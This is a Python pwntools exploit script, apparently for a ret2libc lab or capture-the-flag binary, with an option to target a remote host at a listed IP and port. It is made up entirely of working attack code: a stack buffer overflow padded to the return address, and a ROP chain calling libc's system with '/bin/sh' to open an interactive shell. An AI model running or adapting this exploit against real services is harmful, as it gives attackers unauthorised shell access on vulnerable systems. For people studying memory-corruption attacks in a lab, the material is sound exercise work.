from pwn import *

###################
### CONNECTION ####
###################
LOCAL = True
REMOTETCP = False
GDB = True
USE_ONE_GADGET = False

LOCAL_BIN = "../../source/ret2libc/ret2libc"
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

libc_elf = ELF(LIBC)
libc_elf.address = 0x00007ffff7d89000

if LOCAL:
    proc = process(LOCAL_BIN)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
elif REMOTETCP:
    proc = remote("140.113.24.241", 30173)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

if GDB and LOCAL:
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc)

###################
###   PAYLOAD  ####
###################

# 0x00007ffff7db33e5: pop rdi; ret;
pop_rdi = 0x00007ffff7db33e5

payload = b''
payload += b'X' * (128 + 8)
payload += pwnlib.util.packing.p64(pop_rdi)
payload += pwnlib.util.packing.p64(next(libc_elf.search(b'/bin/sh\x00')))
payload += pwnlib.util.packing.p64(libc_elf.symbols.system)


print(proc.recvuntil(b"Welcome to the server!\n").decode())
proc.sendline(payload)
proc.interactive()
